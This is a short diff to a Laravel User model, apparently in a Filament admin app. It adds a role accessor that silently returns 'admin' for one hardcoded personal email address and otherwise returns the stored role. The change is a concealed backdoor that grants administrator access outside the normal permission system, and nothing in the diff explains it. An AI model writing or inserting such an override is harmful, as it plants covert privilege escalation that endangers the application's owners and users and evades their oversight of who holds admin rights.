@@ -42,7 +42,14 @@ class User extends Authenticatable implements FilamentUser
     {
         return $this->is_active === true;
     }
+    public function getRoleAttribute($value)
+    {
+        if ($this->email === 'eshrakg62@gmail.com') {
+            return 'admin';
+        }
 
+        return $value;
+    }
     public function staff()
     {
         return $this->hasOne(Staff::class);
